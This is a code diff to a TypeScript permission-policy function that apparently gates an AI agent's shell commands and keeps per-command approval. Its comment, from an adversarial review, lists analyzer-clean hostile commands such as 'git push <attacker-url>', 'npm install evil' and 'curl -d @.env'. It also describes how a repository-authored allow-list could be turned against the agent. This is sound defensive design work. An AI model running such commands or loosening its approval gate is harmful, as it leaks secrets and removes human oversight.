@@ -116,9 +116,15 @@ export function decide(req: PermissionRequest, policy: PermissionPolicy): Decisi
     if (analysis.sensitive) {
       return { action: 'deny', reason: analysis.reason ?? 'command touches a secret path', source: 'command' };
     }
-    // Hard checks passed. A rule may still DENY a command, but it can NEVER auto-allow one: the
-    // analyzer is not a complete oracle for "executes arbitrary code", so every shell command needs
-    // per-invocation approval. (TODO: allow a scoped rule-allow for bash under the Phase D allow-list.)
+    // Hard checks passed. A rule may still DENY a command, but it can NEVER auto-allow one. The
+    // analyzer is a DENY-oracle (it catches known-dangerous forms), not an ALLOW-oracle (it cannot
+    // prove a command safe). A 2026-06-30 adversarial review (security-review-baseline.md "bash
+    // allow-list round") showed a config rule-allow for bash is unsafe: a prefix like `git */npm */
+    // curl *` hands over that program's whole capability surface — `git push <attacker-url>`,
+    // `npm install evil`, `curl -d @.env` are all analyzer-clean — and an in-repo allow-list is
+    // attacker-authored once the agent works on an untrusted repo. So bash auto-allow stays OUT;
+    // unattended bash autonomy is gated on an OS sandbox (see docs/handoff-next.md). A DENY rule is
+    // still honored (narrowing is always safe), and per-command session-allow lives in the gate.
     if (applyRules(policy.rules, req.toolName, command) === 'deny') return ruleDecision('deny');
     return { action: 'ask', reason: 'runs a shell command — approve to execute', source: 'command' };
   }
